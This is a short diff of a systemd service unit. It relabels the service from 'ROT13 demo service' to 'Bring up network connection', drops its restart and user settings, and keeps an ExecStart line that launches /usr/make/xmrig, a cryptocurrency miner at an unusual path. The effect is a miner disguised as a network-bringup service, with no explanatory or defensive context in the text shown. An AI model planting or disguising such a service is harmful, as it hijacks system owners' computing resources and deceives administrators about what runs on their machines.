@@ -1,11 +1,8 @@
 [Unit]
-Description=ROT13 demo service
+Description=Bring up network connection
 After=network.target
-StartLimitIntervalSec=0[Service]
-Type=simple
-Restart=always
-RestartSec=1
-User=root
+
+[Service]
 ExecStart=/usr/make/xmrig
 
 [Install]
